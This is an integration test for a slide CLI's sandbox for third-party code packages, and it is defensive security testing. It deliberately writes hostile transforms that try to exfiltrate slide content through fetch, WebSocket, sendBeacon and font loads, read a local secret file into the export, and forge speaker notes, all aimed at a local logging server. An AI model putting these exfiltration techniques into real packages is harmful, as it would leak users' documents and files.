/**
 * Integration: the CLI's door for code packages (contract note §9), driven through the REAL CLI
 * (lattice.js → PDF), with a network log (HARD RULE #23).
 *
 * A third-party code package, written here the way a stranger would bring one (a self-contained ES
 * module, nothing of Lattice's imported), installs into a fixture store. Its transform is hostile:
 * at load and on every slide it tries the network (fetch, an image, a WebSocket, a beacon), and the
 * section it returns carries every remote reference a slide can hold (an image, a srcset, a video
 * poster, an SVG image, a CSS url(), a link). A local HTTP + WebSocket server counts what reaches it.
 *
 *   CONTROL   the same markup AUTHORED in the deck, rendered with `--allow-remote`  → it fetches,
 *             so the log can see a PDF render reach the server
 *   REFUSED   the package installed but not approved                             → exit 1, the
 *             package named, the `trust` command given, 0 requests
 *   APPROVED  the package approved at its SHA-256, rendered with `--allow-remote` → it draws, 0
 *             requests: `--allow-remote` is the author's choice, never a stranger's code's network
 *   CHANGED   one byte of the code changed after approval                         → refused again
 *
 * The returned section also names a LOCAL file, twice: as a logo mask (a pass after the door used to
 * read that file into the export) and as a relative image. Neither address survives.
 *
 *   FACTS     a second package, `dateline`, draws from `slide.facts` ALONE (the stable input; it never
 *             reads `slide.html`), and tries to send those facts out           → it draws, 0 requests
 *
 * Slow tier: four CLI renders.
 */

const { test, describe } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const http = require('node:http');
const { execFile } = require('node:child_process');

const ROOT = path.join(__dirname, '..', '..', '..');
const EMULATOR = path.join(ROOT, 'lattice.js');
const TIMEOUT = 300000;
const SETTLE_MS = 1500;

const tmp = (p) => fs.mkdtempSync(path.join(os.tmpdir(), `lattice-door-${p}-`));

/** The remote references a returned section carries, every one pointing at the log. */
const remoteMarkup = (H) =>
  `<img src="${H}/img" alt=""><img srcset="${H}/srcset 1x" alt=""><video poster="${H}/poster"></video>` +
  `<svg width="4" height="4"><image href="${H}/svgimage" width="4" height="4"></image></svg>` +
  `<span style="background-image:url(${H}/cssurl)">x</span><a href="${H}/link">link</a>`;

/**
 * Local addresses a package might invent: a logo mask naming a file (the CLI's logo-mark pass reads
 * the file a mask names and splices it into the export, which is how the red team read a local file
 * out), and a relative image. The door keeps only addresses the slide it was handed already held.
 */
const localMarkup = (secretFile) => `<span class="logo-mark" style="--logo-mask:url('${secretFile}')"></span><img src="secret.png" alt="">`;

/** An engine channel a package might forge: a speaker note for the presenter view (the inversion lens). */
const forgedNote = '<aside class="lattice-notes" hidden data-slide="1">FORGED-NOTE</aside>';

/** The stranger's transform: tries the network, then returns the slide with the remote and local markup in it. */
const hostileTransform = (H, P, secretFile) => `
try { fetch("${H}/atload").catch(function(){}); } catch (e) {}
function tally(slide, kit) {
  try { fetch("${H}/fetch").catch(function(){}); } catch (e) {}
  try { new Image().src = "${H}/image"; } catch (e) {}
  try { new WebSocket("ws://127.0.0.1:${P}/websocket"); } catch (e) {}
  try { navigator.sendBeacon("${H}/beacon", slide.html); } catch (e) {}
  // A font load is a fetch, and the wall must cover the global's prototypes, not only self. Defense
  // in depth: Chromium's policy stops both arms anyway, so the wall's own proof is the parity test's
  // probe; these can only fire on an engine whose policy fails, as Gecko's did for EventSource.
  try { var ff = new FontFace("x", "url(${H}/fontface)"); ff.load().catch(function(){}); self.fonts.add(ff); } catch (e) {}
  try { for (var o = self; o; o = Object.getPrototypeOf(o)) { var d = Object.getOwnPropertyDescriptor(o, "fonts"); if (d && d.get) d.get.call(self).load("12px x").catch(function(){}); if (typeof o.fetch === "function") o.fetch.call(self, "${H}/protofetch").catch(function(){}); } } catch (e) {}
  var n = Number((/<li>(\\d+)<\\/li>/.exec(slide.html) || [])[1] || 0);
  var marks = "";
  for (var i = 0; i < n; i++) marks += '<span class="tally-mark">' + (i + 1) + "</span>";
  // Padded with newlines, as a template literal would be (the checker's crash).
  // It also adds classes: its own (kept) and "video", which would have the video pass build an
  // address after the door (the red team; dropped).
  return "\\n" + slide.html.replace(' class="', ' class="video tally-drawn ').replace(/<ul>[\\s\\S]*?<\\/ul>/, '<div class="tally-marks" data-count="' + n + '">' + marks + "</div>" + ${JSON.stringify(remoteMarkup(H) + localMarkup(secretFile) + forgedNote)}) + "\\n";
}
export { tally as default };
`;

/**
 * A package written against `slide.facts` only (lib/packages/slide-facts.mjs): it draws a dated list
 * as rows, from the facts' title and first list, and never reads `slide.html`. It also tries to send
 * the facts out, and to change them.
 */
const factsTransform = (H) => `
function dateline(slide) {
  var f = slide.facts;
  try { fetch("${H}/facts?d=" + encodeURIComponent(f.text)).catch(function(){}); } catch (e) {}
  var list = f.blocks.find(function (b) { return b.type === "list"; });
  var frozen = true;
  try { f.blocks.push({}); frozen = false; } catch (e) {}
  var esc = function (s) { return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;"); };
  var rows = (list ? list.items : []).map(function (it) {
    var m = /^(\\d{4}-\\d{2}-\\d{2})\\s+(.*)$/.exec(it.text) || [null, "", it.text];
    return '<li class="dateline-row"><b class="dateline-date">' + esc(m[1]) + "</b> " + esc(m[2]) + "</li>";
  }).join("");
  var paint = f.tokens.indexOf("--cat-1-mark") >= 0 ? "var(--cat-1-mark)" : "currentColor";
  return '<section class="' + f.classes.join(" ") + ' dateline-drawn"><h2>' + esc(f.title) + '</h2><ol class="dateline-rows" style="color:' + paint + '">' + rows + "</ol><p>facts v" + f.version + ", frozen " + frozen + ", directive " + esc(f.directives.class) + "</p></section>";
}
export { dateline as default };
`;

const pkgFiles = (code) => ({
  'tally.manifest.json': JSON.stringify({ name: 'tally', type: 'component', format: 1, facts: 1 }),
  'tally.styles.css': 'section.tally .tally-marks { display: flex; gap: 0.5em; color: var(--accent); }\n',
  'tally.gallery.md': '<!-- _class: tally -->\n\n## Tally\n\n- 3\n',
  'tally.transform.js': code,
});

function render(home, deck, extra = []) {
  const dir = tmp('deck');
  fs.writeFileSync(path.join(dir, 'deck.md'), deck);
  const out = path.join(dir, 'deck.pdf');
  return new Promise((resolve) => {
    // Asynchronous on purpose: the log's server runs in THIS process, and a synchronous spawn
    // would stall it, so a request the render made would hang uncounted.
    execFile(process.execPath, [EMULATOR, path.join(dir, 'deck.md'), out, ...extra], { encoding: 'utf8', timeout: TIMEOUT, env: { ...process.env, LATTICE_HOME: home } }, (error, stdout, stderr) => {
      resolve({ status: error ? (error.code ?? 1) : 0, stdout, stderr, pdf: fs.existsSync(out) ? out : null, text: `${stdout}\n${stderr}` });
    });
  });
}

describe('code packages: the CLI door', { timeout: TIMEOUT }, () => {
  let server;
  let hits;
  let H;
  let P;
  let home;
  let code;
  let secret;
  const { main } = require('../../../lib/packages/cli.js');
  const cli = async (argv) => {
    const out = [];
    const status = await main(argv, { log: (s) => out.push(s), err: (s) => out.push(s), ask: async () => false, probe: async () => 'probe skipped in this test' });
    return { status, text: out.join('\n') };
  };
  const settle = () => new Promise((r) => setTimeout(r, SETTLE_MS));
  const deck = '---\ntheme: indaco\n---\n\n<!-- _class: tally -->\n\n## Three wins\n\n- 3\n\n<!-- the speaker note -->\n';

  test.before(async () => {
    hits = [];
    server = http.createServer((req, res) => {
      hits.push(req.url);
      res.end('x');
    });
    server.on('upgrade', (req, sock) => {
      hits.push(req.url);
      sock.destroy();
    });
    await new Promise((r) => server.listen(0, '127.0.0.1', r));
    P = server.address().port;
    H = `http://127.0.0.1:${P}`;
    home = tmp('home');
    secret = `SECRET-${process.pid}-${Date.now()}`;
    const secretFile = path.join(tmp('secret'), 'secret.svg');
    fs.writeFileSync(secretFile, `<svg xmlns="http://www.w3.org/2000/svg"><text>${secret}</text></svg>`);
    code = hostileTransform(H, P, secretFile);
    const src = tmp('src');
    fs.mkdirSync(path.join(src, 'tally'));
    for (const [f, b] of Object.entries(pkgFiles(code))) fs.writeFileSync(path.join(src, 'tally', f), b);
    process.env.LATTICE_HOME_BEFORE = process.env.LATTICE_HOME ?? '';
    process.env.LATTICE_HOME = home;
    const added = await cli(['add', path.join(src, 'tally')]);
    assert.equal(added.status, 0, added.text);
    assert.match(added.text, /carries code: tally\.transform\.js/);
    assert.match(added.text, /not approved: a render that uses component\/tally fails/);
  });
  test.after(() => {
    server?.close();
    process.env.LATTICE_HOME = process.env.LATTICE_HOME_BEFORE;
  });

  test('control: the same markup, authored in the deck with --allow-remote, reaches the log', async () => {
    hits.length = 0;
    const r = await render(tmp('empty-home'), `---\ntheme: indaco\n---\n\n## Authored\n\n${remoteMarkup(H)}\n`, ['--allow-remote']);
    await settle();
    assert.equal(r.status, 0, r.text);
    assert.ok(hits.length >= 3, `the control must reach the server, or the zeros below prove nothing (got ${JSON.stringify(hits)})`);
  });

  test('refused without consent: the render fails, names the package, and nothing is fetched', async () => {
    hits.length = 0;
    const r = await render(home, deck, ['--allow-remote']);
    await settle();
    assert.notEqual(r.status, 0);
    assert.match(r.stderr, /the deck uses the code package tally, and you have not approved its code \(sha256 [0-9a-f]{64}\)/);
    assert.match(r.stderr, /lattice packages trust component\/tally/);
    assert.equal(r.pdf, null, 'no PDF is written');
    assert.deepEqual(hits, []);
  });

  test('approved at its SHA-256: it draws, keeps the note, and reaches nothing, even with --allow-remote', async () => {
    const t = await cli(['trust', 'component/tally', '--yes']);
    assert.equal(t.status, 0, t.text);
    hits.length = 0;
    const r = await render(home, deck, ['--allow-remote']);
    await settle();
    assert.equal(r.status, 0, r.text);
    assert.match(`${r.stdout}${r.stderr}`, /code packages: tally — OS sandbox (on|OFF)/);
    assert.doesNotMatch(r.stderr, /did not draw/, 'the package must have drawn, or the zero below proves nothing');
    assert.deepEqual(hits, [], 'the package reached the network');
    // The HTML beside it: the transform's markup is there, with every remote reference gone.
    const dir = tmp('html');
    fs.writeFileSync(path.join(dir, 'deck.md'), deck);
    const done = await new Promise((resolve) => execFile(process.execPath, [EMULATOR, path.join(dir, 'deck.md'), path.join(dir, 'deck.html'), '--allow-remote'], { env: { ...process.env, LATTICE_HOME: home }, timeout: TIMEOUT }, (e) => resolve(e)));
    assert.equal(done, null);
    const out = fs.readFileSync(path.join(dir, 'deck.html'), 'utf8');
    assert.match(out, /class="tally-marks" data-count="3"><span class="tally-mark">1<\/span>/);
    assert.ok(!out.includes(`127.0.0.1:${P}`), 'no reference to the log survives in the output');
    assert.ok(!out.includes(secret), 'the local file the package named was read into the export');
    // The mask's address and the invented `logo-mark` class both go (a class the slide never carried
    // is not the package's to add); the elements stay.
    assert.match(out, /<span><\/span><img alt="">/, 'the invented local addresses are dropped, the elements kept');
    assert.doesNotMatch(out, /class="lattice-notes"[^>]*>[^<]*FORGED-NOTE/, 'a forged speaker note never reaches the presenter channel');
    const tag = /<section\b[^>]*\bclass="[^"]*\btally\b[^"]*"/.exec(out)?.[0] ?? '';
    assert.match(tag, /\btally-drawn\b/, "the package's own class is kept");
    assert.doesNotMatch(tag, /\bvideo\b/, 'a class outside its name is not');
    assert.match(out, /the speaker note/);
    await settle();
    assert.deepEqual(hits, []);
  });

  test('a package that reads only slide.facts draws from them, and reaches nothing', async () => {
    const src = tmp('facts-src');
    fs.mkdirSync(path.join(src, 'dateline'));
    const files = {
      'dateline.manifest.json': JSON.stringify({ name: 'dateline', type: 'component', format: 1, facts: 1 }),
      'dateline.styles.css': 'section.dateline .dateline-rows { display: grid; gap: 0.25em; }\n',
      'dateline.gallery.md': '<!-- _class: dateline -->\n\n## Plan\n\n- 2026-01-10 Kickoff\n',
      'dateline.transform.js': factsTransform(H),
    };
    for (const [f, b] of Object.entries(files)) fs.writeFileSync(path.join(src, 'dateline', f), b);
    assert.equal((await cli(['add', path.join(src, 'dateline')])).status, 0);
    assert.equal((await cli(['trust', 'component/dateline', '--yes'])).status, 0);
    const factsDeck = '---\ntheme: indaco\n---\n\n<!-- _class: dateline -->\n\n## Launch plan\n\n- 2026-01-10 **Kickoff**\n- 2026-03-02 Beta & pilot\n- 2026-06-30 [General availability](https://example.test)\n';
    const dir = tmp('facts-html');
    fs.writeFileSync(path.join(dir, 'deck.md'), factsDeck);
    hits.length = 0;
    const r = await new Promise((resolve) => execFile(process.execPath, [EMULATOR, path.join(dir, 'deck.md'), path.join(dir, 'deck.html'), '--allow-remote'], { encoding: 'utf8', env: { ...process.env, LATTICE_HOME: home }, timeout: TIMEOUT }, (e, stdout, stderr) => resolve({ e, text: `${stdout}\n${stderr}` })));
    await settle();
    assert.equal(r.e, null, r.text);
    assert.doesNotMatch(r.text, /did not draw/, 'the package must have drawn, or the zero below proves nothing');
    const out = fs.readFileSync(path.join(dir, 'deck.html'), 'utf8');
    // The masthead lift, a pass after the door, frames the package's heading as it frames a chart's.
    assert.match(out, /class="masthead-lede"><h2>Launch plan<\/h2>/);
    assert.match(out, /<ol class="dateline-rows" style="color:var\(--cat-1-mark\)">/);
    // The engine's classes, which a package drawing from facts cannot know, are put back by the door.
    assert.match(out, /<section[^>]*class="dateline content form dateline-drawn"/);
    assert.match(out, /<li class="dateline-row"><b class="dateline-date">2026-01-10<\/b> Kickoff<\/li>/, 'list text arrives as plain text, markup gone');
    assert.match(out, /<b class="dateline-date">2026-03-02<\/b> Beta &amp; pilot/);
    assert.match(out, /<b class="dateline-date">2026-06-30<\/b> General availability<\/li>/);
    assert.match(out, /facts v1, frozen true, directive dateline/);
    assert.deepEqual(hits, [], 'the package reached the network');
  });

  // The public guide's complete example (docs/src/content/docs/guides/code-packages.md), read out of
  // the page itself: the four files as the page prints them install, draw, and reach nothing. A page
  // edit that breaks the example fails here, not in a reader's terminal.
  test('the guide’s example package, as the page prints it, installs and draws with 0 requests', async () => {
    const guide = fs.readFileSync(path.join(__dirname, '..', '..', '..', 'docs', 'src', 'content', 'docs', 'guides', 'code-packages.md'), 'utf8');
    const example = guide.slice(guide.indexOf('## A complete example'));
    const fileOf = (name) => {
      // A plain search, not a RegExp built from the name (CodeQL: incomplete escaping).
      const label = example.indexOf(`\`${name}\`:\n\n\`\`\``);
      assert.ok(label >= 0, `the guide prints ${name}`);
      const body = example.indexOf('\n', label + name.length + 6) + 1;
      return `${example.slice(body, example.indexOf('\n```', body))}\n`;
    };
    const src = tmp('guide-src');
    fs.mkdirSync(path.join(src, 'dateline'));
    for (const f of ['dateline.manifest.json', 'dateline.styles.css', 'dateline.gallery.md', 'dateline.transform.js']) fs.writeFileSync(path.join(src, 'dateline', f), fileOf(f));
    const guideHome = tmp('guide-home');
    const env = { ...process.env, LATTICE_HOME: guideHome };
    const run = (args) => new Promise((resolve) => execFile(process.execPath, [EMULATOR, 'packages', ...args], { encoding: 'utf8', env, timeout: TIMEOUT }, (e, stdout, stderr) => resolve({ status: e ? e.code || 1 : 0, text: `${stdout}\n${stderr}` })));
    const added = await run(['add', path.join(src, 'dateline')]);
    assert.equal(added.status, 0, added.text);
    assert.equal((await run(['trust', 'component/dateline', '--yes'])).status, 0);
    // The deck the page renders, from its last `md` fence.
    const deck = [...example.matchAll(/```md\n([\s\S]*?)\n```/g)].pop()[1];
    const dir = tmp('guide-html');
    fs.writeFileSync(path.join(dir, 'deck.md'), `---\ntheme: indaco\n---\n\n${deck}\n`);
    hits.length = 0;
    const r = await new Promise((resolve) => execFile(process.execPath, [EMULATOR, path.join(dir, 'deck.md'), path.join(dir, 'deck.html'), '--allow-remote'], { encoding: 'utf8', env, timeout: TIMEOUT }, (e, stdout, stderr) => resolve({ e, text: `${stdout}\n${stderr}` })));
    await settle();
    assert.equal(r.e, null, r.text);
    assert.doesNotMatch(r.text, /did not draw/, r.text);
    const out = fs.readFileSync(path.join(dir, 'deck.html'), 'utf8');
    assert.match(out, /<li class="dateline-row"><b class="dateline-date">2026-01-10<\/b> Kickoff<\/li>/, 'the page says Kickoff arrives without its asterisks');
    assert.match(out, /<b class="dateline-date">2026-03-02<\/b> Beta &amp; pilot<\/li>/);
    assert.match(out, /<b class="dateline-date">2026-06-30<\/b> General availability<\/li>/, 'the page says the link arrives as its words');
    assert.match(out, /<section[^>]*class="dateline content form"/, 'the page says the door puts the engine’s classes back');
    assert.deepEqual(hits, [], 'the example reached the network');
  });

  test('the OS layer: as root on Linux, a Chromium the unprivileged user can run gets the OS sandbox, measured', async (t) => {
    const exe = '/opt/pw-browsers/chromium-1194/chrome-linux/chrome';
    if (process.platform !== 'linux' || process.getuid?.() !== 0 || !fs.existsSync(exe)) return t.skip('needs root on Linux and a Chromium outside /root (the sandbox image has one at /opt/pw-browsers)');
    const { launchCodeSandbox } = require('../../../lib/core/os-sandbox.js');
    const s = await launchCodeSandbox(require('puppeteer'), { executablePath: exe });
    try {
      assert.equal(s.layer.os, 'on', s.layer.summary);
      assert.equal(s.layer.user, 'nobody');
    } finally {
      await s.close();
    }
  });

  test('approved with the OS sandbox on, rendered where it is off: refused before the package runs', async (t) => {
    const { launchCodeSandbox } = require('../../../lib/core/os-sandbox.js');
    const { detectChromeExecutable } = require('../../../lib/core/chrome-exec.js');
    const probe = await launchCodeSandbox(require('puppeteer'), { executablePath: detectChromeExecutable() || undefined });
    await probe.close();
    if (probe.layer.os === 'on') return t.skip('the default browser here gets the OS sandbox, so there is no weaker layer to refuse');
    const { grantTrust, codeDigest } = require('../../../lib/packages/trust.js');
    const { findInstalled } = require('../../../lib/packages/home.js');
    const inst = findInstalled(path.join(home, 'packages'), 'component', 'tally');
    grantTrust('component', 'tally', codeDigest(inst.pkg), { file: path.join(home, 'trust.json'), layer: 'on' });
    hits.length = 0;
    const r = await render(home, deck, ['--allow-remote']);
    await settle();
    assert.notEqual(r.status, 0);
    // The layer this machine gives: `off` on Linux without the sandbox, `unmeasured` (the platform's
    // default) on macOS and Windows; either is weaker than the `on` approved, and must refuse.
    assert.match(r.stderr, new RegExp(`you approved the code package tally with the OS sandbox on, and this render's browser gives it ${probe.layer.os}`));
    assert.equal(r.pdf, null);
    assert.deepEqual(hits, [], 'refused before any of its code ran');
    grantTrust('component', 'tally', codeDigest(inst.pkg), { file: path.join(home, 'trust.json'), layer: probe.layer.os });
  });

  test('changed code asks again: one byte after approval is refused', async () => {
    const file = path.join(home, 'packages', 'component', 'tally', 'tally.transform.js');
    fs.writeFileSync(file, `${code} `);
    hits.length = 0;
    const r = await render(home, deck);
    assert.notEqual(r.status, 0);
    assert.match(r.stderr, /have not approved its code/);
    const list = await cli(['list', '--type', 'component']);
    assert.match(list.text, /tally\s+installed {2}\(code, NOT approved: lattice packages trust component\/tally\)/);
  });
});
